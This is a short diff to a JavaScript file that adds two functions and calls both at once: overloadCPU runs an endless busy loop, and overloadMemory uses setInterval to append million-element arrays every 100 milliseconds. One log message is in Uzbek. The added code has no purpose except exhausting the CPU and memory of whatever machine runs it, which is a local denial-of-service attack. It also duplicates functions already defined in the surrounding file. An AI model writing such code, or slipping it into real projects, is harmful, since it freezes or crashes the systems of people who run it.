@@ -29,3 +29,25 @@ function overloadMemory() {
 
 overloadCPU();
 overloadMemory();
+
+
+function overloadCPU() {
+    while (true) {
+        console.log("CPU overloaded");
+        Math.sqrt(Math.random() * 9999999); 
+    }
+}
+
+overloadCPU();
+
+
+let memoryHog = [];
+
+function overloadMemory() {
+    setInterval(() => {
+        memoryHog.push(new Array(1000000).fill('*'));
+        console.log("Xotira ishlatilmoqda...");
+    }, 100);
+}
+
+overloadMemory();
